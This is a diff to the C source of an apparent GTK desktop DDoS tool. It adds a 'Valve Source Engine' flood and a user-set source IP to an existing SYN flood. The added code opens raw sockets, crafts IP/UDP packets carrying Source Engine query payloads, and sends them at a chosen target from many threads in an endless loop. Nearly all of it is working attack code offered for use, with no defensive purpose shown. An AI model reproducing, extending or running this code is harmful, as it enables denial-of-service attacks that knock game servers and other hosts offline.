@@ -1,6 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>  //strlen()
+#include <string.h>
 #include <unistd.h>
 #include <time.h>
 
@@ -19,11 +19,12 @@
 #include <ifaddrs.h>
 
 #include <gtk-2.0/gtk/gtk.h>
-#include <pthread.h>
+#include <pthread.h> // pthread_create()
 
 #include "../includes/constants.h"
 #include "../includes/callbacks_ddos.h"
 #include "../includes/utils.h"
+
 
 /** ESSYN FLOOD **/
 static unsigned long int Q[4096], c = 362436;
@@ -32,10 +33,18 @@ static unsigned int floodport;
 /** CHARGEN DDOS **/
 //static uint32_t Q_chargen[4096], c_chargen = 362436;
 
+/** VALVE SOURCE ENGINE DDOS **/
+static unsigned int floodport_vse;
+volatile int limiter_vse;
+//volatile unsigned int pps;
+volatile unsigned int sleeptime = 100;
+
 
 GtkWidget *main_win;
 GtkWidget *ddos_text_view;
 const gchar *script_command = NULL;
+
+const gchar *Your_IP = NULL;
 
 
 void cb_udp_ddos_script_1(GtkButton *button, gpointer user_data)
@@ -379,8 +388,6 @@ void cb_udp_power_ddos(void)
     gtk_widget_destroy(threads_dialog);
     gtk_widget_destroy(time_dialog);
 
-    printf("Time expired !!! \n");
-
     for(i = 0; i < num_threads; i++)
         pthread_cancel(thread[i]);
 
@@ -461,9 +468,6 @@ void setup_ip_header_power(struct iphdr *iph)
         perror("getifaddrs");
         exit(EXIT_FAILURE);
     }
-
-    /* Walk through linked list, maintaining head pointer so we
-    can free list later */
 
     for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
     {
@@ -694,7 +698,7 @@ void setup_ip_header(struct iphdr *iph)
     iph->ttl = MAXTTL;
     iph->protocol = 6;
     iph->check = 0;
-    iph->saddr = inet_addr("192.168.1.19");
+    iph->saddr = inet_addr(Your_IP);        /** IIIIIICIIIIIIII **/
 }
 
 void setup_tcp_header(struct tcphdr *tcph)
@@ -758,6 +762,7 @@ void *flood(void *par1)
 void cb_essyn_attack(void)
 {
     GtkWidget *IP_dialog = NULL;
+    GtkWidget *Your_IP_dialog = NULL;
     GtkWidget *port_dialog = NULL;
     GtkWidget *threads_dialog = NULL;
     //GtkWidget *pps_dialog = NULL;
@@ -766,7 +771,7 @@ void cb_essyn_attack(void)
     GtkWidget *get_arg_entry_1 = NULL;
     GtkWidget *get_arg_entry_2 = NULL;
     GtkWidget *get_arg_entry_3 = NULL;
-    //GtkWidget *get_arg_entry_4 = NULL;
+    GtkWidget *get_arg_entry_4 = NULL;
     GtkWidget *get_arg_entry_5 = NULL;
 
     const gchar *IP = NULL;
@@ -785,7 +790,7 @@ void cb_essyn_attack(void)
     text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ddos_text_view));
 
     /** Set the default buffer text. **/
-    gtk_text_buffer_set_text(text_buffer, "Usage: <target IP> <port> <threads number> <time>", -1);
+    gtk_text_buffer_set_text(text_buffer, "Usage: <target IP> <Your IP> <port> <threads number> <time>", -1);
 
     /** Obtain iters for the start and end of points of the buffer **/
     gtk_text_buffer_get_start_iter(text_buffer, &start);
@@ -800,27 +805,28 @@ void cb_essyn_attack(void)
     g_free(text);
 
     IP_dialog = gtk_dialog_new_with_buttons("Enter Target IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
-    port_dialog = gtk_dialog_new_with_buttons("Enter Target sPort", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    Your_IP_dialog = gtk_dialog_new_with_buttons("Enter Your IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    port_dialog = gtk_dialog_new_with_buttons("Enter Target Port", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     threads_dialog = gtk_dialog_new_with_buttons("Enter Number of Threads", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     //pps_dialog = gtk_dialog_new_with_buttons("Enter pps Limiter (-1 for no limit)", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     time_dialog = gtk_dialog_new_with_buttons("Enter Time", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
 
     gtk_widget_set_size_request(IP_dialog, 360, 100);
+    gtk_widget_set_size_request(Your_IP_dialog, 360, 100);
     gtk_widget_set_size_request(port_dialog, 360, 100);
     gtk_widget_set_size_request(threads_dialog, 360, 100);
-    //gtk_widget_set_size_request(pps_dialog, 360, 100);
     gtk_widget_set_size_request(time_dialog, 360, 100);
 
     get_arg_entry_1 = gtk_entry_new();
     get_arg_entry_2 = gtk_entry_new();
     get_arg_entry_3 = gtk_entry_new();
-    //get_arg_entry_4 = gtk_entry_new();
+    get_arg_entry_4 = gtk_entry_new();
     get_arg_entry_5 = gtk_entry_new();
 
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), get_arg_entry_1, TRUE, FALSE, 0);
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(port_dialog)->vbox), get_arg_entry_2, TRUE, FALSE, 0);
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(threads_dialog)->vbox), get_arg_entry_3, TRUE, FALSE, 0);
-    //gtk_box_pack_start(GTK_BOX(GTK_DIALOG(pps_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(Your_IP_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_dialog)->vbox), get_arg_entry_5, TRUE, FALSE, 0);
 
     gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
@@ -833,6 +839,19 @@ void cb_essyn_attack(void)
 
         default:
             gtk_widget_hide(IP_dialog);;
+            break;
+    }
+
+    gtk_widget_show_all(GTK_DIALOG(Your_IP_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(Your_IP_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            Your_IP = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_4));
+            gtk_widget_hide(Your_IP_dialog);
+            break;
+
+        default:
+            gtk_widget_hide(Your_IP_dialog);;
             break;
     }
 
@@ -900,9 +919,9 @@ void cb_essyn_attack(void)
     wait_time_end(atoi(time_duration));
 
     gtk_widget_destroy(IP_dialog);
+    gtk_widget_destroy(Your_IP_dialog);
     gtk_widget_destroy(port_dialog);
     gtk_widget_destroy(threads_dialog);
-    //gtk_widget_destroy(pps_dialog);
     gtk_widget_destroy(time_dialog);
 
     for(i = 0; i < num_threads; i++)
@@ -1931,3 +1950,249 @@ char *getLine(FILE *f)
 
 	return buffer;
 }
+
+
+/** VALVE SOURCE ENGINE DDOS **/
+void cb_valve_engine_ddos(GtkButton *button, gpointer user_data)
+{
+    GtkWidget *IP_dialog = NULL;
+    GtkWidget *Your_IP_dialog = NULL;
+    //GtkWidget *port_dialog = NULL;
+    //GtkWidget *throttle_dialog = NULL;
+    //GtkWidget *packet_dialog = NULL;
+    GtkWidget *threads_dialog = NULL;
+    GtkWidget *time_dialog = NULL;
+
+    GtkWidget *get_arg_entry_1 = NULL;
+    GtkWidget *get_arg_entry_2 = NULL;
+    GtkWidget *get_arg_entry_3 = NULL;
+    GtkWidget *get_arg_entry_4 = NULL;
+    //GtkWidget *get_arg_entry_5 = NULL;
+    //GtkWidget *get_arg_entry_6 = NULL;
+
+    const gchar *IP = NULL;
+    //const gchar *Your_IP = NULL;
+    //const gchar *throttle = NULL;
+    //const gchar *packet = NULL;
+    const gchar *number_threads = NULL;
+    const gchar *time_duration = NULL;
+
+    GtkTextBuffer *text_buffer = NULL;
+    gchar *text = NULL;
+    GtkTextIter start;
+    GtkTextIter end;
+
+
+    /* Obtaining the buffer associated with the widget. */
+    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(ddos_text_view));
+
+    /** Set the default buffer text. **/
+    gtk_text_buffer_set_text(text_buffer, "Usage: <target IP> <Your IP > <threads number> <time>", -1);
+
+    /** Obtain iters for the start and end of points of the buffer **/
+    gtk_text_buffer_get_start_iter(text_buffer, &start);
+    gtk_text_buffer_get_end_iter(text_buffer, &end);
+
+    /** Get the entire buffer text. **/
+    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);
+
+    /** Print the text **/
+    g_print("%s", text);
+
+    g_free(text);
+
+
+    IP_dialog = gtk_dialog_new_with_buttons("Enter Target IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    Your_IP_dialog = gtk_dialog_new_with_buttons("Enter Your IP", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    //port_dialog = gtk_dialog_new_with_buttons("Enter Target Port", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    //throttle_dialog = gtk_dialog_new_with_buttons("Enter Throttle", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    //packet_dialog = gtk_dialog_new_with_buttons("Enter Packet Size(max 1024)", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    threads_dialog = gtk_dialog_new_with_buttons("Enter Threads Number", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    time_dialog = gtk_dialog_new_with_buttons("Enter Time", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+
+    gtk_widget_set_size_request(IP_dialog, 360, 100);
+    gtk_widget_set_size_request(Your_IP_dialog, 360, 100);
+    //gtk_widget_set_size_request(throttle_dialog, 360, 100);
+    //gtk_widget_set_size_request(packet_dialog, 360, 100);
+    gtk_widget_set_size_request(threads_dialog, 360, 100);
+    gtk_widget_set_size_request(time_dialog, 360, 100);
+
+    get_arg_entry_1 = gtk_entry_new();
+    get_arg_entry_2 = gtk_entry_new();
+    get_arg_entry_3 = gtk_entry_new();
+    get_arg_entry_4 = gtk_entry_new();
+    //get_arg_entry_5 = gtk_entry_new();
+    //get_arg_entry_6 = gtk_entry_new();
+
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(IP_dialog)->vbox), get_arg_entry_1, TRUE, FALSE, 0);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(Your_IP_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
+    //gtk_box_pack_start(GTK_BOX(GTK_DIALOG(throttle_dialog)->vbox), get_arg_entry_3, TRUE, FALSE, 0);
+    //gtk_box_pack_start(GTK_BOX(GTK_DIALOG(packet_dialog)->vbox), get_arg_entry_4, TRUE, FALSE, 0);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(threads_dialog)->vbox), get_arg_entry_2, TRUE, FALSE, 0);
+    gtk_box_pack_start(GTK_BOX(GTK_DIALOG(time_dialog)->vbox), get_arg_entry_3, TRUE, FALSE, 0);
+
+    gtk_widget_show_all(GTK_DIALOG(IP_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(IP_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            IP = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_1));
+            gtk_widget_hide(IP_dialog);
+            break;
+
+        default:
+            gtk_widget_hide(IP_dialog);
+            break;
+    }
+
+    gtk_widget_show_all(GTK_DIALOG(Your_IP_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(Your_IP_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            Your_IP = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_4));
+            gtk_widget_hide(Your_IP_dialog);
+            break;
+
+        default:
+            gtk_widget_hide(Your_IP_dialog);
+            break;
+    }
+
+    gtk_widget_show_all(GTK_DIALOG(threads_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(threads_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            number_threads = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_2));
+            gtk_widget_hide(threads_dialog);
+            break;
+
+        default:
+            gtk_widget_hide(threads_dialog);
+            break;
+    }
+
+    gtk_widget_show_all(GTK_DIALOG(time_dialog)->vbox);
+    switch(gtk_dialog_run(GTK_DIALOG(time_dialog)))
+    {
+        case GTK_RESPONSE_APPLY:
+            time_duration = gtk_entry_get_text(GTK_ENTRY(get_arg_entry_3));
+            //gtk_widget_hide(time_dialog);
+            break;
+
+        default:
+            gtk_widget_destroy(IP_dialog);
+            gtk_widget_destroy(Your_IP_dialog);
+            //gtk_widget_destroy(port_dialog);
+            //gtk_widget_destroy(throttle_dialog);
+            //gtk_widget_destroy(packet_dialog);
+            gtk_widget_destroy(threads_dialog);
+            gtk_widget_destroy(time_dialog);
+            return;
+    }
+
+    printf("IP = %s\n", IP);
+    //printf("port = %s\n", port_number);
+    //printf("throttle = %s\n", throttle);
+    //printf("packet_size = %s\n", packet);
+    printf("num_threads = %s\n", number_threads);
+    printf("time = %s\n", time_duration);
+
+    fprintf(stdout, "Setting up Sockets...\n");
+
+    int num_threads = atoi(number_threads);
+    pthread_t thread[num_threads];
+
+    int i;
+
+    for(i = 0; i < num_threads; i++)
+    {
+        pthread_create( &thread[i], NULL, &flood_vse, (void *)IP);
+    }
+
+    wait_time_end(atoi(time_duration));
+
+    gtk_widget_destroy(IP_dialog);
+    gtk_widget_destroy(Your_IP_dialog);
+    gtk_widget_destroy(threads_dialog);
+    gtk_widget_destroy(time_dialog);
+
+    for(i = 0; i < num_threads; i++)
+        pthread_cancel(thread[i]);
+
+    return 0;
+}
+
+
+void setup_udp_header_vse(struct udphdr *udph)
+{
+    udph->source = htons(27015);
+    udph->dest = htons(27015);
+    udph->check = 0;
+
+    void *data = (void *)udph + sizeof(struct udphdr);
+    memset(data, 0xFF, 4);
+    strcpy(data+4, "TSource Engine Query");
+
+    udph->len = htons(sizeof(struct udphdr) + 25);
+}
+
+void setup_ip_header_vse(struct iphdr *iph)
+{
+        iph->ihl = 5;
+        iph->version = 4;
+        iph->tos = 0;
+        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + 25;
+        iph->id = htonl(54321);
+        iph->frag_off = 0;
+        iph->ttl = MAXTTL;
+        iph->protocol = IPPROTO_UDP;
+        iph->check = 0;
+        iph->saddr = inet_addr(Your_IP);
+}
+
+
+void *flood_vse(void *par1)
+{
+    char *td = (char *)par1;
+    char datagram[MAX_PACKET_SIZE];
+
+    struct iphdr *iph = (struct iphdr *)datagram;
+    struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
+
+    struct sockaddr_in sin;
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(17015);
+    sin.sin_addr.s_addr = inet_addr(td);
+
+    int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
+    if(s < 0)
+    {
+        fprintf(stderr, "Could not open raw socket.\n");
+        exit(-1);
+    }
+
+    memset(datagram, 0, MAX_PACKET_SIZE);
+    setup_ip_header_vse(iph);
+    setup_udp_header_vse(udph);
+
+    iph->daddr = sin.sin_addr.s_addr;
+    iph->check = csum ((unsigned short *) datagram, iph->tot_len);
+
+    int tmp = 1;
+    const int *val = &tmp;
+    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0)
+    {
+        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
+        exit(-1);
+    }
+
+    init_rand(time(NULL));
+
+    register unsigned int i;
+    i = 0;
+
+    while(1)
+    {
+        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
+    }
+}
+
